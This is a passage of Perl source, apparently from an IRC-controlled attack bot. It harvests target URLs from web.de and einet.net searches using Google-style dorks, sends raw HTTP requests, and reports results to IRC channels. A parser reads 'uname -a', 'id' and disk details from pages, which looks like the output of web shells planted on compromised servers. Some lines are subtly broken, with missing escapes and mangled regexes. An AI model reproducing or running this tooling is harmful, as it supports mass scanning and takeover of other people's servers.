}

sub webde () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    for $p(1..50){
        my $webdelink = ("http://suche.web.de/search/web/?pageIndex=".$p."&su=".key($key)."&y=0&x=0&mc=suche@web@navigation@zahlen.suche@web");
        my $re = query($webdelink);
        while($re =~ m/href="http:\/\/(.+?)\">/g) {
            my $tsite = $1;
            if ($tsite !~ /\/search\/web|web.de|\" class=\"neww\"/){
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsiten";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub einet () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $einetest = ("http://www.einet.net/view/search.gst?p=1&k=".key($key)."&s=0&submit=Search");
    my $einet3st = query($einetest);
    if ($einet3st =~ /<span class=nPage>Page 1 ofs+(.+?)</span>/){
        my $totz = $1;
        for ($p=1;$p<=$totz;$p++){
            my $einetlink = ("http://www.einet.net/view/search.gst?p=".$p."&k=".key($key)."&s=0&submit=Search");
            my $re = query($einetlink);
            while($re =~ m/<span class=url2>s+(.+?)</span>/g) {
                my $tsite = $1;
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsite\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}


sub remove() {
    my $file = $_[0];
    system("rm $file");
}

sub clean () {
    $dork = $_[0];
    if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
        writ1("15,1[+] 4,1Cleaning Dork from Google Search Keys !");
        $dork =~ s/^inurl://g;
        $dork =~ s/^allinurl://g;
        $dork =~ s/^intext://g;
        $dork =~ s/^allintext://g;
        $dork =~ s/^intitle://g;
        $dork =~ s/^allintitle://g;
    }
    return $dork;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /+/g;
    $dork =~ s/:/%3A/g;
    $dork =~ s///\%2F/g;
    $dork =~ s/&/%26/g;
    $dork =~ s/"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->timeout(3);
    my $response = $ua->request($req);
    return $response->content;
}

sub query1() {
    my $url = $_[0];
    my $host  = $url;
    my $query = $url;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    eval {
        my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
        print $sock "GET $query HTTP/1.0rnHost: $hostrnAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        my @r = <$sock>;
        $page = "@r";
        close($sock);
    };
    return $page;
}

sub os() {
    my $site = $_[0];
    my $ret  = &query($site);
    while ( $ret =~ m/<br>uname -a:(.+?)\<br>/g ) {
        $un = $1;
    }
    while ( $ret =~ m/<br>os:(.+?)\<br>/g ) {
        $os = $1;
    }
    while ( $ret =~ m/<br>id:(.+?)\<br>/g ) {
        $id1 = $1;
    }
    while ( $ret =~ m/<br>free:(.+?)\<br>/g ) {
        $free = $1;
    }
    while ( $ret =~ m/<br>used:(.+?)\<br>/g ) {
        $used = $1;
    }
    while ( $ret =~ m/<br>total:(.+?)\<br>/g ) {
        $all = $1;
    }
}

sub unici {
    my @unici = ();
    my %visti = ();
    foreach my $elemento (@_) {
        $elemento =~ s/\/+/\//g;
        next if $visti{$elemento}++;
        push @unici, $elemento;
    }
    return @unici;
}
      

sub writ1 () {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan1 :$cont\n";
}

sub writ2 () {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan2 :$cont\n";
}

sub priv8 () {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan2 :$cont\n";
}


## PRIVATE
## Coded by watchdog